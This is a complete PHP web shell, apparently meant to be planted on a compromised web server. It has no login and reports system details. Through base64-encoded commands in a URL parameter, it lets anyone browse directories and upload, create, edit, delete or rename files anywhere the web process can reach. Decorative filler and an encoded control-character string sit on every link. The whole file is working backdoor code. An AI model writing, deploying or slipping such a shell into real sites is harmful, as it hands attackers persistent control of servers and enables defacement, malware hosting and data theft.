<?php
session_start();

function randomFunction() {
    $randomString = bin2hex(random_bytes(96));
    return $randomString;
}

$randomString = randomFunction();
echo "<p style='color: green;'>กิ่งก้อยกิ่งก้อยกิ่งก้อย $randomString</p>";

function systemCheck() {
    $info = php_uname();
    $phpVersion = phpversion();
    echo "<p style='color: green;'>System Info: $info | PHP Version: $phpVersion</p>";
}

systemCheck();

$special_chars = "%00%0A%09//#";

function encodeCommand($command) {
    return base64_encode($command);
}

function decodeCommand($encoded) {
    return base64_decode($encoded);
}

function displayDirectory($path) {
    global $special_chars;
    $items = array_diff(scandir($path), ['.', '..']);
    echo "<h3 style='color: green;'>Current Directory: $path</h3><ul>";
    foreach ($items as $item) {
        $itemPath = realpath($path . DIRECTORY_SEPARATOR . $item);
        if (is_dir($itemPath)) {
            $navigateCommand = encodeCommand('navigate|' . $itemPath);
            echo "<li><a href='?data=$navigateCommand'>$item</a></li>";
        } else {
            $editCommand = encodeCommand('action|edit|' . $path . '|' . $item);
            $deleteCommand = encodeCommand('action|delete|' . $path . '|' . $item);
            $renameCommand = encodeCommand('action|rename|' . $path . '|' . $item);
            echo "<li>$item <a href='?data=$editCommand'>$special_chars Edit</a> | 
                          <a href='?data=$deleteCommand'>$special_chars Delete</a> | 
                          <a href='?data=$renameCommand'>$special_chars Rename</a></li>";
        }
    }
    echo "</ul>";
}

function handleFileUpload($path) {
    if (!empty($_FILES['file']['name'])) {
        $target = $path . DIRECTORY_SEPARATOR . basename($_FILES['file']['name']);
        if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
            echo "<p style='color: green;'>File uploaded successfully!</p>";
        } else {
            echo "<p style='color: red;'>Failed to upload file.</p>";
        }
    }
}


function createNewFolder($path) {
    if (!empty($_POST['folder_name'])) {
        $folderPath = $path . DIRECTORY_SEPARATOR . $_POST['folder_name'];
        if (!file_exists($folderPath)) {
            mkdir($folderPath);
            echo "<p style='color: green;'>Folder created: {$_POST['folder_name']}</p>";
        } else {
            echo "<p style='color: red;'>Folder already exists.</p>";
        }
    }
}


function createNewFile($path) {
    if (!empty($_POST['file_name'])) {
        $filePath = $path . DIRECTORY_SEPARATOR . $_POST['file_name'];
        if (!file_exists($filePath)) {
            file_put_contents($filePath, '');
            echo "<p style='color: green;'>File created: {$_POST['file_name']}</p>";
        } else {
            echo "<p style='color: red;'>File already exists.</p>";
        }
    }
}


function displayEditForm($filePath, $path) {
    $content = file_exists($filePath) ? htmlspecialchars(file_get_contents($filePath)) : '';
    echo "<form method='POST' action='?data=" . encodeCommand('action|edit|' . $path . '|' . basename($filePath)) . "'>
            <textarea name='content' style='width:100%; height:300px;'>$content</textarea><br>
            <button type='submit'>Save</button>
          </form>";
}


function deleteFile($filePath) {
    if (file_exists($filePath)) {
        if (unlink($filePath)) {
            echo "<p style='color: green;'>File deleted successfully.</p>";
        } else {
            echo "<p style='color: red;'>Failed to delete file.</p>";
        }
    } else {
        echo "<p style='color: red;'>File does not exist.</p>";
    }
}


function displayRenameForm($itemPath, $path) {
    echo "<form method='POST' action='?data=" . encodeCommand('action|rename|' . $path . '|' . basename($itemPath)) . "'>
            <input type='text' name='new_name' placeholder='New Name'>
            <button type='submit'>Rename</button>
          </form>";
}


if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_GET['data'])) {
        $command = decodeCommand($_GET['data']);
        $parts = explode('|', $command, 4);
        if ($parts[0] == 'action' && $parts[1] == 'edit') {
            $path = $parts[2];
            $item = $parts[3];
            $itemPath = $path . DIRECTORY_SEPARATOR . $item;
            if (isset($_POST['content'])) {
                file_put_contents($itemPath, $_POST['content']);
                echo "<p style='color: green;'>File updated successfully!</p>";
            }
        } elseif ($parts[0] == 'action' && $parts[1] == 'rename') {
            $path = $parts[2];
            $item = $parts[3];
            $itemPath = $path . DIRECTORY_SEPARATOR . $item;
            if (isset($_POST['new_name'])) {
                $newPath = $path . DIRECTORY_SEPARATOR . $_POST['new_name'];
                if (rename($itemPath, $newPath)) {
                    echo "<p style='color: green;'>Item renamed successfully.</p>";
                } else {
                    echo "<p style='color: red;'>Failed to rename item.</p>";
                }
            }
        } elseif ($parts[0] == 'navigate') {
            $path = $parts[1];
            if (isset($_FILES['file'])) {
                handleFileUpload($path);
            } elseif (isset($_POST['folder_name'])) {
                createNewFolder($path);
            } elseif (isset($_POST['file_name'])) {
                createNewFile($path);
            }
        }
        $navigateCommand = encodeCommand('navigate|' . $path);
        header("Location: ?data=$navigateCommand");
        exit;
    }
}


if (isset($_GET['data'])) {
    $command = decodeCommand($_GET['data']);
    $parts = explode('|', $command, 4);
    if ($parts[0] == 'navigate') {
        $path = $parts[1];
        $parentPath = dirname($path);
        $goUpCommand = encodeCommand('navigate|' . $parentPath);
        echo "<a href='?data=$goUpCommand'>$special_chars Go Up</a>";
        displayDirectory($path);
        echo "<h3 style='color: green;'>Upload File</h3>
              <form method='POST' enctype='multipart/form-data' action='?data=" . encodeCommand('navigate|' . $path) . "'>
                <input type='file' name='file'><button type='submit'>$special_chars Upload</button>
              </form>";
        echo "<h3 style='color: green;'>Create Folder</h3>
              <form method='POST' action='?data=" . encodeCommand('navigate|' . $path) . "'>
                <input type='text' name='folder_name' placeholder='Folder Name'><button type='submit'>$special_chars Create</button>
              </form>";
        echo "<h3 style='color: green;'>Create File</h3>
              <form method='POST' action='?data=" . encodeCommand('navigate|' . $path) . "'>
                <input type='text' name='file_name' placeholder='File Name'><button type='submit'>$special_chars Create</button>
              </form>";
    } elseif ($parts[0] == 'action') {
        $action = $parts[1];
        $path = $parts[2];
        $item = $parts[3];
        $itemPath = $path . DIRECTORY_SEPARATOR . $item;
        if ($action == 'delete') {
            deleteFile($itemPath);
            $navigateCommand = encodeCommand('navigate|' . $path);
            header("Location: ?data=$navigateCommand");
            exit;
        } elseif ($action == 'edit') {
            displayEditForm($itemPath, $path);
        } elseif ($action == 'rename') {
            displayRenameForm($itemPath, $path);
        }
    }
} else {
    $path = getcwd();
    $parentPath = dirname($path);
    $goUpCommand = encodeCommand('navigate|' . $parentPath);
    echo "<a href='?data=$goUpCommand'>$special_chars Go Up</a>";
    displayDirectory($path);
    echo "<h3 style='color: green;'>Upload File</h3>
          <form method='POST' enctype='multipart/form-data' action='?data=" . encodeCommand('navigate|' . $path) . "'>
            <input type='file' name='file'><button type='submit'>$special_chars Upload</button>
          </form>";
    echo "<h3 style='color: green;'>Create Folder</h3>
          <form method='POST' action='?data=" . encodeCommand('navigate|' . $path) . "'>
            <input type='text' name='folder_name' placeholder='Folder Name'><button type='submit'>$special_chars Create</button>
          </form>";
    echo "<h3 style='color: green;'>Create File</h3>
          <form method='POST' action='?data=" . encodeCommand('navigate|' . $path) . "'>
            <input type='text' name='file_name' placeholder='File Name'><button type='submit'>$special_chars Create</button>
          </form>";
}
?>